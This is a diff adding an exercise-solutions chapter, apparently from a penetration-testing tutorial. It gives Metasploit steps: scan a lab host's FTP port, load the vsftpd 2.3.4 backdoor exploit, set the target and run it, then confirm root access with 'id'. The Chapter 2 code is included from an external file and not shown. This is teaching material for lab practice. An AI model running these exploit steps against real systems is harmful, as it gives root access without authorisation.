@@ -1,0 +1,25 @@
+\chapter{Solutions to Exercises}
+In this chapter I show my solutions to the exercises from the previous chapters.
+
+\section{Chapter 1}
+A possible solution is:
+
+\begin{enumerate}
+    \item\texttt{msf6 > nmap -p21 -sV 10.0.2.4}
+    \item\texttt{msf6 > search vsfptd} \\
+    \texttt{msf6 > use exploit/unix/ftp/vsftpd\_234\_backdoor}
+    \item\texttt{msf6 > set RHOST 10.0.2.4}
+    \item\texttt{msf6 > run}
+    \begin{warnbox}
+        Even though the exploit is successful and we get remote code execution, we do not get a prompt.
+    \end{warnbox}
+    \item\texttt{id}
+    \item The user is already root
+\end{enumerate}
+
+\section{Chapter 2}
+A possible solution is:
+
+\begin{listingbox}
+    \lstinputlisting[language=ruby]{chapters/code/chapter2_solution.rb}
+\end{listingbox}
